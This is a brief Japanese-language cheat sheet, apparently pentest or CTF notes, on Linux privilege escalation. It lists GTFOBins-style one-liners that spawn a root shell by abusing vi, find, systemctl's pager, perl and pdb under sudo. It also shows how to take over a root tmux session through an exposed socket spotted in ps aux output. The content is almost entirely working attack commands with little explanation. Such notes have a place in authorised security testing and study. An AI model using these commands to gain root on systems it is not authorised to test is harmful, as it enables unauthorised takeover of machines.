# GTFOBins  
https://gtfobins.github.io/  

```bash
# viの悪用
:set shell=/bin/sh
:shell
# findの悪用
sudo find . -exec /bin/sh \; -quit
# systemctlとpagerの悪用
sudo systemctl status <サービス>
- (press RETURN)!sh
# perlの悪用
sudo perl -e 'exec "/bin/sh";'
# pdbの悪用
import os;os.system('/bin/sh')
```

# tmuxとは
1つのターミナル画面を複数のウィンドウに分割できるツール。  
ソケットファイルが公開されていて、読み書き権限があれば権限昇格できる可能性が高い。
```bash
ps aux
root       1027  0.0  0.1  26416  1676 ?        Ss   04:55   0:00 /usr/bin/tmux -S /.devs/dev_sess
tmux -S /.devs/dev_sess # rootターミナル起動
```
